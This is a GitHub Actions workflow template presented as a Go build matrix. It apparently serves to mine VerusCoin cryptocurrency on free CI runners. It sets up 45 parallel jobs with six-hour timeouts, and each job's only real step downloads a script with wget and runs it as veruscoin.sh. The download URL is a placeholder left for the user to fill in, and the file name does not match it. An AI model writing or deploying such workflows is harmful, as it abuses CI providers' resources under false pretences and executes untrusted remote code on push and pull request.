name: VERUSCOIN
on: [push, pull_request]
jobs:
  build:
    name: Verus1
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 30
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D, E, F, G, H, I]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Verus1
      run: |
        wget https://github.com/Ganti_punya_kalian && chmod u+x veruscoin.sh && ./veruscoin.sh
